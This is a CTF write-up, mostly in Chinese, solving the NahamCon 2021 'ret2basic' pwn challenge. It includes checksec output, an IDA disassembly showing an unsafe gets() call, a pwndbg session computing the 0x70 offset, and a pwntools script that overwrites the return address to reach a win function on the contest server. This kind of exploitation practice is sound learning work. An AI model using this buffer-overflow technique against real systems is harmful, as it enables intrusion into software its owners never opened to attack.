# ret2text NahamCon CTF 2021 ret2basic

> 2021 NahamCon CTF https://ctf.nahamcon.com/   https://ctftime.org/event/1281/tasks/
>
> challenge name: ret2basic
>
> file: `ret2basic`
>
> refer writeup: https://coldfusionx.github.io/posts/ret2basic/    用到了gef which is GDB enhanced features，过程中的操作与我的解法有所不同，同时总结了32bit 64bit系统的区别，就算会做这题了也值得一看
>
> https://ctftime.org/event/1281/tasks/ 其他人的writeup可以在这找，也可以去github直接搜，根据看的几份writeup来看，大部分不会用IDA分析，而我用IDA可能是做reverse题带来的坏猫病

- 这道题与`demo_ROP_ret2text`不能说相似只能说是完全相同
- 属于没有骚操作的常规ROP(ret2text)题目，分值在200左右

解题步骤：

1. 找到可供溢出的危险函数`gets`
2. 计算出`gets`的参数的地址与RBP之间的偏移量，该偏移量+8即为返回地址（64bit为8byte）
3. 找到目标函数win的函数地址，该函数会执行`cat flag.txt`
4. 构造payload为 偏移量 + 8 + win函数地址

# checksec

```bash
$ file ret2basic
ret2basic: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3ca85eae693fed659275c0eed9c313e7f0083b85, for GNU/Linux 4.4.0, not stripped
$ checksec --file=ret2basic
RELRO         STACK CANARY    NX          PIE      RPATH     RUNPATH     Symbols      FORTIFY Fortified    Fortifiable  FILE
Partial RELRO No canary found NX enabled  No PIE   No RPATH  No RUNPATH  59) Symbols    No    0            3            ret2basic
```

- 64bit ELF, No canary



# IDA Analysis

- `main`函数会调用的`vuln`函数：

```assembly
.text:000000000040130F                 public vuln
.text:000000000040130F vuln            proc near               ; CODE XREF: main+9↓p
.text:000000000040130F
.text:000000000040130F var_70          = byte ptr -70h  ; 这里的值就是与RBP的偏移量，没有错。分析错的情况应该与push mov指令的区别、等效有关
.text:000000000040130F
.text:000000000040130F ; __unwind {
.text:000000000040130F                 push    rbp
.text:0000000000401310                 mov     rbp, rsp
.text:0000000000401313                 sub     rsp, 70h
.text:0000000000401317                 lea     rdi, format     ; "Can you overflow this?: "
.text:000000000040131E                 mov     eax, 0
.text:0000000000401323                 call    _printf
.text:0000000000401328                 lea     rax, [rbp+var_70] ; 这里把 gets 的参数地址载入到了rax中，即执行完此句，rax为gets参数地址
.text:000000000040132C                 mov     rdi, rax   ; 故可以把断点下在这个地方，然后看rax与rbp的值，计算偏移量
.text:000000000040132F                 mov     eax, 0
.text:0000000000401334                 call    _gets    ; 危险函数！！！！！！
.text:0000000000401339                 nop
.text:000000000040133A                 leave
.text:000000000040133B                 retn
.text:000000000040133B ; } // starts at 40130F
.text:000000000040133B vuln            endp
```

- 重点关注断点位置

# gdb Analysis

```assembly
$ gdb ret2basic
.........................................................................................
pwndbg> b * 0x000000000040132C
Breakpoint 1 at 0x40132c
pwndbg> r
Starting program: /home/kali/CTF/pwn/ret2basic
Can you overflow this?:
Breakpoint 1, 0x000000000040132c in vuln ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────
 RAX  0x7fffffffe240 —▸ 0x7ffff7fab980 (_IO_2_1_stdin_) ◂— 0xfbad208b
 RBX  0x0
 RCX  0x0
 RDX  0x0
 RDI  0x7ffff7fae670 (_IO_stdfile_1_lock) ◂— 0x0
 RSI  0x7fffffffbbc0 ◂— 'Can you overflow this?: '
 R8   0x0
 R9   0x18
 R10  0x40205a ◂— 'Can you overflow this?: '
 R11  0x246
 R12  0x401100 (_start) ◂— endbr64
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0x7fffffffe2b0 —▸ 0x7fffffffe2c0 —▸ 0x401360 (__libc_csu_init) ◂— endbr64
 RSP  0x7fffffffe240 —▸ 0x7ffff7fab980 (_IO_2_1_stdin_) ◂— 0xfbad208b
 RIP  0x40132c (vuln+29) ◂— mov    rdi, rax
───────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
 ► 0x40132c <vuln+29>    mov    rdi, rax <0x7ffff7fae670>
   0x40132f <vuln+32>    mov    eax, 0
   0x401334 <vuln+37>    call   gets@plt <gets@plt>

   0x401339 <vuln+42>    nop
   0x40133a <vuln+43>    leave
   0x40133b <vuln+44>    ret

   0x40133c <main>       push   rbp
   0x40133d <main+1>     mov    rbp, rsp
   0x401340 <main+4>     mov    eax, 0
   0x401345 <main+9>     call   vuln <vuln>

   0x40134a <main+14>    lea    rdi, [rip + 0xd22]
────────────────────────────────────────────[ STACK ]───────────────────────────────────────────
00:0000│ rax rsp  0x7fffffffe240 —▸ 0x7ffff7fab980 (_IO_2_1_stdin_) ◂— 0xfbad208b
01:0008│          0x7fffffffe248 —▸ 0x7ffff7e63c38 (setbuffer+200) ◂— test   dword ptr [rbx], 0x8000
02:0010│          0x7fffffffe250 ◂— 0x0
03:0018│          0x7fffffffe258 ◂— 0x1
04:0020│          0x7fffffffe260 —▸ 0x7fffffffe280 ◂— 0x2
05:0028│          0x7fffffffe268 ◂— 0x1
06:0030│          0x7fffffffe270 —▸ 0x7fffffffe3b8 —▸ 0x7fffffffe646 ◂— '/home/kali/CTF/pwn/ret2basic'
07:0038│          0x7fffffffe278 —▸ 0x401212 (setup+44) ◂— nop
────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────
 ► f 0           40132c vuln+29
   f 1           40134a main+14
   f 2     7ffff7e13d0a __libc_start_main+234
```

- `0x7fffffffe240 - 0x7fffffffe2b0 = -0x70 ` gets函数的参数到RBP的偏移量

# Exploit

```python
from pwn import *
context.log_level = 'debug'
sh = remote('challenge.nahamcon.com', 30413) 
target = 0x0000000000401215 # win 函数的起始地址，从IDA中分析出来
payload = b'A' * (0x70 + 8) + p64(target)  # 注意这个是64bit ELF，所以 return address and saved registers 都是64bit的
sh.sendline(payload)
sh.interactive()
```

